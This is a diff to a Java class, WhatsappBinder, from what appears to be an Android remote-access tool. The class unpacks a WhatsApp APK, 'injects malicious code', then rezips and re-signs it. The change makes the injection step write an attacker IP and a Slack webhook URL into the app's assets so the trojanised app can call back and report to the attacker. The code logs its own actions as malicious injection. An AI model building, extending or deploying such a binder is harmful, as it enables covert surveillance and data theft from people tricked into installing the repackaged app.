@@ -51,7 +51,7 @@ public class WhatsappBinder extends AsyncTask<String, String, Boolean> {
         init();
         if (loadResources())
             if (unzip())
-                if (edit_app(strings[0]))
+                if (edit_app(strings[0],strings[1]))
                     if (zip())
                         if (sign()) {
                             deleteFolder(working_dir + "normal_apk");
@@ -112,28 +112,26 @@ public class WhatsappBinder extends AsyncTask<String, String, Boolean> {
             return false;
         }
     }
-    private boolean edit_app(String ip){
+    private boolean edit_app(String ip, String slackHook){
         log.i("[*] Trying to inject malicious code");
-        String fileName = res_dir+"ip.txt";
-        File file = new File(fileName);
-        FileReader fr = null;
-        String line;
         try {
-            fr = new FileReader(file);
-            BufferedReader br = new BufferedReader(fr);
             if(new File(working_dir+"normal_apk/assets").exists()) {
                 FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
-                while((line=br.readLine()) != null){
-                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
-                }//loop
+                if(slackHook.length()>0){
+                    fw.write(ip+"\n"+slackHook);
+                } else {
+                    fw.write(ip+"\n"+ "slackhook");
+                }
                 fw.close();
                 log.s("[+] Injected malicious code Successfully!");
                 return true;
             }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
                 FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
-                while((line=br.readLine()) != null){
-                    fw.write(line.replaceAll("http://192.168.43.1:8080",ip));
-                }//loop
+                if(slackHook.length()>0){
+                    fw.write(ip+"\n"+slackHook);
+                } else {
+                    fw.write(ip+"\n"+ "slackhook");
+                }
                 fw.close();
                 log.s("[+] Injected malicious code Successfully!");
                 return true;
